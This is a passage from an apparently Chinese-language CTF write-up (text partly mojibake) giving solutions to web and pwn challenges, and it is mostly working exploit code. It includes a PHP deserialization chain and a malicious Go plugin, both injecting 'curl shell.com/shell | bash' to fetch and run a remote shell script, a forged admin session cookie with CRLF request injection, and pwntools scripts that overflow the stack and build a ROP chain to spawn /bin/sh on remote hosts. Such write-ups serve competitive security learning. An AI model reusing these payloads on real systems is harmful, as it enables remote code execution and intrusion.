</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>f3</span> <span class=o>=</span> <span class=n>require</span><span class=p>(</span><span class=s1>&#39;lib/base.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>ws</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>CLI</span>\<span class=n>WS</span><span class=p>(</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>);</span> <span class=o>//</span><span class=err>è®©</span> <span class=n>base</span> <span class=n>autoload</span> <span class=err>å‡½æ•°åŠ è½½</span> <span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>ws</span><span class=o>.</span><span class=n>php</span><span class=p>,</span> <span class=err>ä¹‹åæ‰èƒ½ç”¨</span> <span class=n>agent</span> <span class=err>ç±»</span><span class=p>,</span> <span class=err>æ‰€ä»¥è¦å¥—ä¸€å±‚</span> <span class=n>ws</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>agent</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>CLI</span>\<span class=n>Agent</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>ws</span><span class=o>-&gt;</span><span class=n>a</span> <span class=o>=</span> <span class=o>$</span><span class=n>agent</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>sqlMapper</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>DB</span>\<span class=n>SQL</span>\<span class=n>Mapper</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>sqlMapper</span><span class=o>-&gt;</span><span class=n>setProps</span><span class=p>(</span><span class=n>array</span><span class=p>(</span><span class=s2>&#34;insertone&#34;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>new</span> <span class=n>Base</span><span class=p>(),</span> <span class=s2>&#34;clear&#34;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mongoMapper</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>DB</span>\<span class=n>Mongo</span>\<span class=n>Mapper</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mongoMapper</span><span class=o>-&gt;</span><span class=n>setDocument</span><span class=p>(</span><span class=s2>&#34;\$</span><span class=se>\n</span><span class=s2>);system(&#39;bash -c </span><span class=se>\&#34;</span><span class=s2>curl shell.com/shell | bash</span><span class=se>\&#34;</span><span class=s2>&#39;);//&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mongoMapper</span><span class=o>-&gt;</span><span class=n>setCollenciton</span><span class=p>(</span><span class=o>$</span><span class=n>sqlMapper</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>event</span> <span class=o>=</span> <span class=n>array</span><span class=p>(</span><span class=s2>&#34;disconnect&#34;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=o>$</span><span class=n>mongoMapper</span><span class=p>,</span> <span class=s2>&#34;insert&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>server</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>DB</span>\<span class=n>Mongo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>server</span><span class=o>-&gt;</span><span class=n>events</span> <span class=o>=</span> <span class=o>$</span><span class=n>event</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>agent</span><span class=o>-&gt;</span><span class=n>setServer</span><span class=p>(</span><span class=o>$</span><span class=n>server</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>dump</span> <span class=o>=</span> <span class=n>serialize</span><span class=p>(</span><span class=o>$</span><span class=n>ws</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>(</span><span class=s1>&#39;curl http://webweb.wmctf.wetolink.com/?a=&#39;</span> <span class=o>.</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>dump</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=gogogo>gogogo</h3><p><strong>First Blood</strong></p><p>ä¸‰ä¸ªç‚¹, math/rand æ˜¯ä¼ªéšæœº, è€Œä¸”ä¸æ’­ç§çš„è¯ç»“æœéƒ½æ˜¯ä¸€æ ·çš„, æœ¬åœ°ç”¨åŒæ ·ç¯å¢ƒæ­ä¸€ä¸ªå°±å¯ä»¥æ‹¿åˆ° admin session</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åè€ç‰ˆæœ¬ go èƒ½ crlf, <a href=https://github.com/golang/go/issues/30794>https://github.com/golang/go/issues/30794</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import requests
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for i in range(97, 122):
</span></span><span class=line><span class=cl>    print(chr(i))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>crlf = open(&#39;/tmp/7&#39;, &#39;rb&#39;).read().decode()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>data = {
</span></span><span class=line><span class=cl>    &#39;fn&#39;: &#39;Req&#39;,
</span></span><span class=line><span class=cl>    &#39;arg&#39;: &#34;http://127.0.0.1/auth/login?a= HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n&#34; + crlf + &#39;\r\n\r\n&#39;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sess = requests.session()
</span></span><span class=line><span class=cl>sess.headers[&#39;Cookie&#39;] = &#39;o=MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>res = sess.post(&#39;http://gogogo.wmctf.wetolink.com/admin/invoke&#39;, data=data)
</span></span><span class=line><span class=cl>print(res.text)
</span></span></code></pre></td></tr></table></div></div><p>æœ€å plugin å¿…é¡»å’Œç¼–è¯‘ä¸»ç¨‹åºåŒä¸€ä¸ªç‰ˆæœ¬æ‰èƒ½è¢«åŠ è½½, è¯•äº†åŠå¤©å‘ç°è¯» /proc/self/environ å¯ä»¥è¯»åˆ°æ˜¯ 1.9.7
ä¹‹åç¼–è¯‘ä¸€ä¸ªä¼ ä¸Šå»ç­‰åº”ç”¨é‡å¯å°±èƒ½ rce äº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os/exec&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>Read</span><span class=p>(</span><span class=nx>input</span> <span class=kt>string</span><span class=p>)</span> <span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=nx>input</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>cmd</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=s>&#34;bash&#34;</span><span class=p>,</span> <span class=s>&#34;-c&#34;</span><span class=p>,</span> <span class=s>&#34;curl shell.com/shell | bash&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>cmd</span><span class=p>.</span><span class=nf>Run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[]</span><span class=kt>byte</span><span class=p>{},</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn>Pwn</h2><h3 id=mengyedekending>mengyedekending</h3><p>C# PWN</p><p>ç„å­¦å•Šï¼Œè®²é“ç†åç§»æŒ‡å®šä¸º220æ˜¯å¯ä»¥è¦†ç›–åˆ°numæ¥è§¦å‘åé—¨çš„ï¼Œä½†æ˜¯æˆ‘è¾“å…¥220ä¹‹ååç§»è¢«èµ‹å€¼æˆäº†50ï¼Ÿ</p><p>æ²¡äº‹äº†ï¼Œ\rå¯ä»¥æ— é™åœ°å‘åæ¨indexï¼Œæ¨åˆ°numå†™ä¸ª0å°±okäº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>io = remote(&#34;111.73.46.229&#34;,51000)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>io.sendlineafter(&#34;repeat?\r\n&#34;,&#34;\r&#34;*108+&#34;\0&#34;)
</span></span><span class=line><span class=cl>io.sendlineafter(&#34;input?\r\n&#34;,&#34;y&#34;)
</span></span><span class=line><span class=cl>io.sendlineafter(&#34;!\r\n&#34;,str(220))
</span></span><span class=line><span class=cl>io.interactive()
</span></span></code></pre></td></tr></table></div></div><h3 id=csgo>csgo</h3><p>è¿‡äº†100å…³ä¹‹åå‘ç°ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œæœ¬åœ°è°ƒè¯•é€šè¿‡è¦†ç›–æ ˆä¸Šçš„å‚æ•°æ³„éœ²pieåœ°å€ï¼Œéƒ¨åˆ†è¦†ç›–è¿”å›åœ°å€è·³å›backdoorï¼ˆè¿™é‡Œè¦çˆ†ç ´1/16ï¼‰ã€‚ç„¶åæ³„éœ²é“¾å¼æ ˆåœ°å€ç”¨äºå®šä½<code>/bin/sh</code>å‚æ•°ï¼Œæœ€åROPè·å¾—shellã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>aslr</span> <span class=o>=</span> <span class=n>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;81.68.174.63&#39;</span><span class=p>,</span><span class=mi>62176</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># r = process(&#34;./pwn&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getline</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=n>l</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>b</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>	<span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>l</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\xe2</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\x9b</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\xa9</span><span class=s1>&#39;</span> <span class=ow>and</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;</span><span class=se>\x9a</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>b</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getmap</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>m</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=n>getline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=n>n</span> <span class=o>=</span> <span class=n>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=n>change</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>m</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>a</span> <span class=o>=</span> <span class=n>getline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=n>n</span> <span class=o>=</span> <span class=n>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>a</span> <span class=o>=</span> <span class=n>change</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>m</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>x</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pas</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=n>x</span> <span class=o>=</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl>	<span class=n>l</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>	<span class=n>mm</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>help</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;hhh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;plz input x:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span><span class=p>));</span>
</span></span><span class=line><span class=cl>		<span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=n>l</span><span class=p>,</span> <span class=n>mm</span> <span class=o>=</span> <span class=n>getmap</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>				<span class=n>help</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>mm</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>k</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;your answer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>answer</span> <span class=o>=</span> <span class=n>help</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=n>answer</span> <span class=o>=</span> <span class=n>help</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>answer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>help</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span> <span class=s2>&#34;level &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34; ok!&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span> <span class=n>answer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pas</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># gdb.attach(r, &#34;b * 0x743c9 + 0x555555554000&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1># raw_input()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x70</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xc000000030</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x88</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\xF0\xD0</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your name is : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pie</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>+</span> <span class=mh>0x555555554000</span> <span class=o>-</span> <span class=mh>0x55555575aac0</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;pie: &#34;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>pie</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x70</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xc000000180</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x88</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pie</span> <span class=o>+</span> <span class=mh>0x1190F0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your name is : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;stack: &#34;</span> <span class=o>+</span> <span class=n>hex</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x109d3d</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi_r15</span> <span class=o>=</span> <span class=mh>0x119c45</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx_adc_rax</span> <span class=o>=</span> <span class=mh>0x79e6e</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=mh>0x743c9</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl><span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=mh>0x74e29</span> <span class=o>+</span> <span class=n>pie</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x70</span> <span class=o>/</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xC000000180</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x88</span> <span class=o>/</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># payload += p64(pop_rdx_adc_rax) + p64(0)</span>
</span></span><span class=line><span class=cl><span class=c1># payload += p64(pop_rsi_r15) + p64(0) + p64(0)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span> <span class=o>+</span> <span class=mh>0xDC8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x3b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>å…¶ä¸­hhhçš„æºç :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
